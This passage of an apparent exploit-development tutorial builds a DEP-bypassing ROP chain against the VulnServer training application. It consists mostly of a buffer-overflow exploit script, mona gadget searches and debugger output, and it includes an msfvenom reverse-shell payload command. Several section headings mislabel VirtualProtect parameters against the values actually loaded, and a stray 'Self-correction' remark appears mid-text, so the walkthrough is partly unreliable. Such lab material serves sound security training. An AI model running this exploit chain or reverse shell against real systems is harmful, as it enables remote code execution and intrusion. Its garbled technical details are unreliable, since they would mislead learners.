the Vulnerability\u003c/h2\u003e\n\u003cp\u003eLet's start by confirming that DEP is indeed preventing our standard exploit. A typical buffer overflow exploit for VulnServer would look like this:\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eimport struct\nimport socket\n\ntarget = (\"192.168.0.111\", 9999)  # VulnServer\n\nVULNSRVR_CMD = b\"TRUN /.:/\"\nOFFSET = 2003  # Bytes until we reach EIP\nJMP_ESP = 0x625011AF  # Address of a JMP ESP instruction\n\n# Shellcode - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\\x00'\nshellcode = b\"SHELLCODE\"\n\npayload = VULNSRVR_CMD\npayload += b\"A\" * OFFSET\npayload += struct.pack(\"\u0026#x3C;I\", JMP_ESP)\npayload += b\"\\x90\" * 16  # NOP sled\npayload += shellcode\n\nwith socket.create_connection(target) as sock:\n    sock.recv(512)  # Welcome message\n    sock.send(payload)\n    print(\"[+] Exploit sent\")\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen we run this with DEP enabled, our exploit fails with an access violation. Checking memory protection in the debugger confirms the issue:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!vprot esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eBaseAddress:       00b4f000\nAllocationBase:    00950000\nAllocationProtect: 00000004  PAGE_READWRITE\nRegionSize:        00001000\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE\nType:              00020000  MEM_PRIVATE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe stack is marked as PAGE_READWRITE (not executable), confirming DEP is active and blocking our shellcode execution.\u003c/p\u003e\n\u003ch2\u003e2. Finding the Buffer Overflow Offset\u003c/h2\u003e\n\u003cp\u003eFirst things first - we need to find exactly where our input overwrites EIP:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eGenerate a cyclic pattern:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona pc 3000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e\nCreating cyclic pattern of 3000 bytes\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eCreate a script to send this pattern:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003epattern = b\"Aa0Aa1Aa2Aa3Aa4Aa5...\" # Copy from mona output\npayload = b\"TRUN /.:/\" + pattern\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eAfter sending the pattern and crashing the server, find our exact offset:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona findmsp -distance 3000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[+] Examining registers\n EIP contains normal pattern : 0x396f4338 (offset 2003)\n ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)\n EBP contains normal pattern : 0x6f43376f (offset 2001)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe now know our offset to EIP is 2003 bytes.\u003c/p\u003e\n\u003ch2\u003e3. Manual Gadget Hunting\u003c/h2\u003e\n\u003cp\u003eThis is where the real work begins. To build our ROP chain, we need to find small code snippets (\"gadgets\") in memory that end with a RET instruction. These will be the building blocks of our DEP bypass.\u003c/p\u003e\n\u003ch3\u003e3.1 Finding Base ROP Gadgets\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eFirst, lets identify non-ASLR modules:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona modules\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\\VulnApps\\essfunc.dll) 0x0\n0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\\VulnApps\\vulnserver.exe) 0x0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe'll use essfunc.dll because it's typically compiled without ASLR (Address Space Layout Randomization) and Rebase support in standard VulnServer setups (indicated by 'False' in the ASLR/Rebase columns). This simplifies our focus on the DEP bypass itself. Bypassing ASLR would require additional techniques, such as information leaks to find module base addresses dynamically, which are beyond the scope of this specific guide.\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eFind a simple RET instruction (ROP NOP):\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"ret\" -m essfunc -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe'll use 0x62501022 as our ROP NOP.\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eFind a JMP ESP gadget:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona jmp -r esp -m essfunc -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]\n0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe'll use 0x625011AF for our JMP ESP gadget later if needed, but the primary one for the final VirtualProtect return will be identified separately (we used 0x625011c7 in the final chain). (Self-correction: Clarified the JMP ESP usage slightly).\u003c/p\u003e\n\u003ch3\u003e3.2 Finding System DLL Gadgets\u003c/h3\u003e\n\u003cp\u003eWe also need gadgets from system DLLs to complete our chain:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFind PUSHAD instruction:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pushad # ret\" -m \"msvcrt,ntdll,kernel32\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x775d6f67 : pushad | ret [msvcrt.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eFind gadgets for setting other registers:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"xchg eax, edx # ret\" -m \"ntdll\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eFind gadgets for setting \"neg eax, ret\" registers:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"neg eax # ret\" -m \"kernel32\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e4. Finding VirtualProtect in IAT\u003c/h2\u003e\n\u003cp\u003eTo bypass DEP, we'll use Windows' VirtualProtect function to change memory permissions. First, we need to find its address in the Import Address Table (IAT):\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eExamine the IAT and search for VirtualProtect:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!dh essfunc -f\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e 5000 [     197] address [size] of Export Directory\n 6000 [     224] address [size] of Import Directory\n    0 [       0] address [size] of Resource Directory\n    0 [       0] address [size] of Exception Directory\n    0 [       0] address [size] of Security Directory\n 7000 [      E4] address [size] of Base Relocation Directory\n    0 [       0] address [size] of Debug Directory\n    0 [       0] address [size] of Description Directory\n    0 [       0] address [size] of Special Directory\n    0 [       0] address [size] of Thread Storage Directory\n    0 [       0] address [size] of Load Configuration Directory\n    0 [       0] address [size] of Bound Import Directory\n    0 [       0] address [size] of Import Address Table Directory\n    0 [       0] address [size] of Delay Import Directory\n    0 [       0] address [size] of COR20 Header Directory\n    0 [       0] address [size] of Reserved Directory\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eDump the IAT and search for VirtualProtect:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003edps essfunc+0x6000 L100\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e 62506090  764cb3a0 KERNEL32!AddAtomA\n 62506094  764cb860 KERNEL32!FindAtomA\n 62506098  7650d160 KERNEL32!GetAtomNameA\n 6250609c  764d6570 KERNEL32!VirtualProtectStub\n 625060a0  764d7b60 KERNEL32!VirtualQueryStub\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eVerify this is the correct function:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003edd 0x6250609c L1\nu poi(0x6250609c)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e764d6570 8bff            mov     edi,edi\n764d6572 55              push    ebp\n764d6573 8bec            mov     ebp,esp\n764d6575 5d              pop     ebp\n764d6576 ff253cb85376    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (7653b83c)]\nKERNEL32!AppModelPolicy_GetPolicy_Internal:\n764d657c 8bff            mov     edi,edi\n764d657e 55              push    ebp\n764d657f 8bec            mov     ebp,esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe've confirmed 0x6250609c is the IAT entry for VirtualProtect.\u003c/p\u003e\n\u003ch2\u003e5. Finding a Writable Memory Region\u003c/h2\u003e\n\u003cp\u003eFor the VirtualProtect call, the lpflOldProtect parameter requires a pointer to a writable memory location. We need to find such a location that is reliable and doesn't contain bad characters in its address. We can inspect the memory layout of loaded modules, like KERNEL32.DLL, to find writable sections.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eFirst, find the base address of KERNEL32.DLL:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003elm vm kernel32\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003estart    end        module name\n764c0000 765b0000   kernel32   (deferred)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo, the base address is 0x764c0000.\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eNow, examine the PE header of KERNEL32.DLL to find its sections:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!dh 0x764c0000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eScroll through the output looking for the \"SECTION HEADER\" information. You are looking for a section with \"Write\" permissions (often .data).\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[...]\nSECTION HEADER #6\n   .data name\n  5AF4 virtual size\n 7A000 virtual address (RVA)\n  5C00 size of raw data\n 78C00 file pointer to raw data\n     0 file pointer to relocation table\n     0 file pointer to line numbers\n     0 number of relocations\n     0 number of line numbers\n40000040 flags\n         Initialized Data\n         Read Write  \u0026#x3C;-- Writable permissions!\n[...]\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eIdentify a writable section. The .data section looks promising:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eIt has Read Write permissions.\u003c/li\u003e\n\u003cli\u003eIts Relative Virtual Address (RVA) is 0x7a000.\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003eCalculate the absolute start address of the .data section:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e? \u0026#x3C;base_address\u003e + \u0026#x3C;RVA\u003e\n? 0x764c0000 + 0x7a000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eEvaluate expression: 1985187840 = 7653a000\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003e\n\u003cp\u003eChoose an address within this writable section. We need an address suitable for lpflOldProtect. Let's use 0x7653a3c1, which is used later in the ROP chain. This address is calculated as 0x7653a000 + 0x3c1. Since 0x3c1 is less than the section size (0x5af4), this address lies within the writable .data section.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eVerify the chosen address 0x7653a3c1 has the expected permissions:\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!vprot 0x7653a3c1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eBaseAddress:       7653a000\nAllocationBase:    764c0000\nAllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY\nRegionSize:        00006000  // Note: RegionSize might cover more than just .data\nState:             00001000  MEM_COMMIT\nProtect:           00000004  PAGE_READWRITE  \u0026#x3C;-- Confirmed Writable\nType:              01000000  MEM_IMAGE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe have successfully identified 0x7653a3c1 within KERNEL32.DLL's .data section as a suitable writable address using PE header inspection. We will use this address for the lpflOldProtect parameter.\u003c/p\u003e\n\u003ch2\u003e6. Building Register Setup for VirtualProtect\u003c/h2\u003e\n\u003cp\u003eNow we'll build our ROP chain to call VirtualProtect. Here's the function prototype:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eBOOL VirtualProtect(\n  LPVOID lpAddress,      // [ESP+4]  (Memory address to modify)\n  SIZE_T dwSize,         // [ESP+8]  (Size of region)\n  DWORD flNewProtect,    // [ESP+12] (Memory protection flag)\n  PDWORD lpflOldProtect  // [ESP+16] (Pointer to store old protection)\n);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen we use PUSHAD, the registers are pushed in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI.\u003c/p\u003e\n\u003cp\u003eThese values will map to VirtualProtect's parameters as follows:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eBOOL VirtualProtect(\n  LPVOID lpAddress,      // ECX -\u003e [ESP+4]  (Address of shellcode)\n  SIZE_T dwSize,         // EDX -\u003e [ESP+8]  (Size of region to make executable)\n  DWORD flNewProtect,    // EBX -\u003e [ESP+C]  (PAGE_EXECUTE_READWRITE 0x40)\n  PDWORD lpflOldProtect  // ESP+8 -\u003e [ESP+10] (Writable memory address)\n);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet's build our ROP chain, setting up each register with the right value:\u003c/p\u003e\n\u003ch3\u003e6.1 Setting up EBP (Stack Alignment)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# EBP - Used for stack pivot or alignment\nebp = struct.pack(\"\u0026#x3C;I\", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]\nebp += struct.pack(\"\u0026#x3C;I\", 0x775d8836)  # skip 4 bytes [msvcrt.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x775d8836 (same as gadget address)\n\u003cstrong\u003eReason\u003c/strong\u003e: This serves as a placeholder and helps with stack alignment. Using the same address helps maintain predictable stack behavior.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop ebp # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUse JMP ESP directly\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eebp = struct.pack(\"\u0026#x3C;I\", 0x775d8836)  # pop ebp; ret\nebp += struct.pack(\"\u0026#x3C;I\", 0x625011af)  # jmp esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eOther module address\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eebp = struct.pack(\"\u0026#x3C;I\", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]\nebp += struct.pack(\"\u0026#x3C;I\", 0x76fa54a3)  # same address\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.2 Setting up EBX (flNewProtect parameter)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# EBX - Size parameter (0x201)\nebx = struct.pack(\"\u0026#x3C;I\", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]\nebx += struct.pack(\"\u0026#x3C;I\", 0xfffffdff)  # Value to negate, will become 0x00000201\nebx += struct.pack(\"\u0026#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]\nebx += struct.pack(\"\u0026#x3C;I\", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x201 (Size of region to protect)\n\u003cstrong\u003eReason\u003c/strong\u003e: This needs to be large enough to cover our shellcode (513 bytes).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we calculated it\u003c/strong\u003e: Using negation technique to avoid null bytes:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eLoad EAX with 0xfffffdff (value to negate, will become 0x00000201)\u003c/li\u003e\n\u003cli\u003eNegate EAX to get 0x201\u003c/li\u003e\n\u003cli\u003eExchange EAX and EBX\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found these gadgets\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n!py mona find -type instr -s \"neg eax\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"xchg eax, ebx\" -m \"msvcrt\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eAdding from zero\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eebx = struct.pack(\"\u0026#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0x775b3084)  # add eax, 0x100; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0x775b3084)  # add eax, 0x100; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0x775b616f)  # add eax, 8; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0x77597926)  # xchg eax, ebx; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eDifferent size value\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eebx = struct.pack(\"\u0026#x3C;I\", 0x75f366b4)  # pop eax; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0xfffffeff)  # -0x101 (smaller region)\nebx += struct.pack(\"\u0026#x3C;I\", 0x76505808)  # neg eax; ret\nebx += struct.pack(\"\u0026#x3C;I\", 0x77597926)  # xchg eax, ebx; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.3 Setting up EDX (dwSize parameter)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# EDX - Protection flag (0x40)\nedx = struct.pack(\"\u0026#x3C;I\", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]\nedx += struct.pack(\"\u0026#x3C;I\", 0xffffffc0)  # Value to negate, will become 0x00000040\nedx += struct.pack(\"\u0026#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]\nedx += struct.pack(\"\u0026#x3C;I\", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x40 (PAGE_EXECUTE_READWRITE)\n\u003cstrong\u003eReason\u003c/strong\u003e: This is the memory protection flag to make our shellcode executable.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we calculated it\u003c/strong\u003e: Using negation to avoid null bytes:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eLoad EAX with 0xffffffc0 (value to negate, will become 0x00000040)\u003c/li\u003e\n\u003cli\u003eNegate EAX to get 0x40\u003c/li\u003e\n\u003cli\u003eExchange EAX and EDX\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found these gadgets\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop eax\" -m \"kernelbase\" -cpb \"\\x00\"\n!py mona find -type instr -s \"neg eax\" -m \"kernel32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"xchg eax, edx\" -m \"ntdll\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eDirect POP\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eedx = struct.pack(\"\u0026#x3C;I\", 0x77e4b949)  # pop edx; ret\nedx += struct.pack(\"\u0026#x3C;I\", 0x00000040)  # PAGE_EXECUTE_READWRITE\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eArithmetic with other constants\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eedx = struct.pack(\"\u0026#x3C;I\", 0x77cef70e)  # xor eax, eax; ret\nedx += struct.pack(\"\u0026#x3C;I\", 0x775a5f04)  # add eax, 0x20; ret\nedx += struct.pack(\"\u0026#x3C;I\", 0x775a5f04)  # add eax, 0x20; ret\nedx += struct.pack(\"\u0026#x3C;I\", 0x77d9e6c0)  # xchg eax, edx; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e6.4 Setting up ECX (lpAddress parameter)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eecx = struct.pack(\"\u0026#x3C;I\", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]\necx += struct.pack(\"\u0026#x3C;I\", 0x7653a3c1)  # \u0026#x26;Writable location [KERNEL32.DLL]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x7653a3c1 (Writable memory address in KERNEL32.DLL)\n\u003cstrong\u003eReason\u003c/strong\u003e: This register needs to hold the pointer to a writable memory location (lpflOldProtect parameter) where VirtualProtect can store the old memory protection flags.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e: We identified a suitable writable address within KERNEL32.DLL's .data in Section 5.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found the gadget\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop ecx # ret\" -m \"msvcrt\" -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUsing essfunc.dll's writable memory\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eecx = struct.pack(\"\u0026#x3C;I\", 0x775f94ee)  # pop ecx; ret\necx += struct.pack(\"\u0026#x3C;I\", 0x62506228)  # Writable memory in essfunc.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eStack Address\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# Use the current ESP value plus an offset\necx = struct.pack(\"\u0026#x3C;I\", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eStack Address (More complex): Technique exist to calculate and use an address on the stack itself, but require careful offset management.\u003c/p\u003e\n\u003ch3\u003e6.5 Setting up EDI (ROP NOP)\u003c/h3\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# EDI - Return address (ROP NOP)\nedi = struct.pack(\"\u0026#x3C;I\", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]\nedi += struct.pack(\"\u0026#x3C;I\", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCurrent Value\u003c/strong\u003e: 0x7650580a (RET instruction)\n\u003cstrong\u003eReason\u003c/strong\u003e: EDI isn't used directly in the VirtualProtect call, but it needs a valid address. A simple RET instruction works as a placeholder.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHow we found it\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e!py mona find -type instr -s \"pop edi\" -m \"ws2_32\" -cpb \"\\x00\"\n!py mona find -type instr -s \"ret\" -m kernel32 -cpb \"\\x00\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Options\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eAny harmless gadget\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eedi = struct.pack(\"\u0026#x3C;I\", 0x76fe83f7)  # pop edi; ret\nedi += struct.pack(\"\u0026#x3C;I\", 0x90909090)  # NOP values\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eSecondary return address\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre 